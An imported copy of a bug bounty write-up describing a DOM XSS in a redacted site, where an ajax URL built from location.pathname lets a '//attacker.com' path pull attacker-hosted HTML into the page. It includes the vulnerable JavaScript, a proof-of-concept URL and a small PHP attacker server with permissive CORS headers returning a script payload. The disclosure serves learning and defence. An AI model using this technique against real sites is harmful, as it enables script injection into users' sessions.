---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-24_bugbounty-a-dom-xss.md
original_filename: 2019-12-24_bugbounty-a-dom-xss.md
title: BugBounty | A Dom Xss
category: documents
detected_topics:
- xss
- ssrf
- command-injection
- cors
tags:
- imported
- documents
- xss
- ssrf
- command-injection
- cors
language: en
raw_sha256: b920d5829f75f372b3109c5cbab288706ab8e6bba2daf28e6f3a9396e0975ad4
text_sha256: 6bba2a7db31b57e2e07e9a1a774663b4b334be99fc289062f84705af3e448520
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# BugBounty | A Dom Xss

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-24_bugbounty-a-dom-xss.md
- Source Type: markdown
- Detected Topics: xss, ssrf, command-injection, cors
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `b920d5829f75f372b3109c5cbab288706ab8e6bba2daf28e6f3a9396e0975ad4`
- Text SHA256: `6bba2a7db31b57e2e07e9a1a774663b4b334be99fc289062f84705af3e448520`


## Content

---
title: "BugBounty | A Dom Xss"
page_title: "BugBounty | A Dom Xss – Jinone – 败絮其中"
url: "https://jinone.github.io/bugbounty-a-dom-xss/"
final_url: "https://jinone.github.io/bugbounty-a-dom-xss/"
authors: ["Jinone (@jinonehk)"]
bugs: ["DOM XSS"]
bounty: "500"
publication_date: "2019-12-24"
added_date: "2022-09-26"
source: "pentester.land/writeups.json"
original_index: 4863
---

# BugBounty | A Dom Xss

2019-12-24 

  * [ bugbounty ](https://jinone.github.io/tags#bugbounty)
  * [ Xss ](https://jinone.github.io/tags#Xss)

I was working on a private program which i cannot disclose

I checked the js file by the way when I checked the request. Found a suspicious piece of code

**www.xxxxx.com** domain

**/xxxxxxxxx/** path

https://www.xxxxx.com/xxxxxxxxx/pdp.min.js

Vuln code

![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t33.png)

ajax Get request response write to page

![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t44.png)

Normal request looks like this

Visit this site

https://www.xxxxx.com/xxxxxxxxx

ajax will make such a request

https://www.xxxxx.com/xxxxxxxxx/showProductRedemption?productCode=263625
  
  
  var prefix = location.pathname;
  var url = prefix + "/showProductRedemption?productCode=" + vpCode;
  $.ajax({
  url: url,
  type: "GET",
  dataType: "html",
  success: function(res) {
  PDP.AjaxResponse.showProductRedemption(res);
  },
  error: function(res) {
  console.error(res);
  }
  });
  

But **_location.pathname_** attackers can control

So when location.pathname is set to //attacker.com

The browser will go to attacker.com

This will visit the attacker’s website to get their website content

**POC**

https://www.xxxxx.com//attacker.com/xxxxxxxxx

location.pathname is //attacker.com/xxxxxxxxx
  
  
  //attacker.com = https://attacker.com
  

ajax will request https://attacker.com/xxxxxxxxx for the response content

Attackers just need to set up their own website content

After Ajax gets the response from the attacker’s website, it will write xsspayload to the page

An example with php
  
  
  <?php
  header("Access-Control-Allow-Origin: *");
  header("Access-Control-Allow-Credentials: true");
  header("Access-Control-Request-Methods:GET, POST, PUT, DELETE, OPTIONS");
  
  echo '<script>alert(1);</script>';
  ?>
  

So when the user visits https://www.xxxxx.com//attacker.com/xxxxxxxxx

Will trigger this dom xss![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t31.png)

Finally

![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t20.png)

Thanks!

[  BugBounty | A Simple SSRF ](https://jinone.github.io/bugbounty-a-simple-ssrf/) [ 基于dom的一些前端漏洞  ](https://jinone.github.io/dom/)
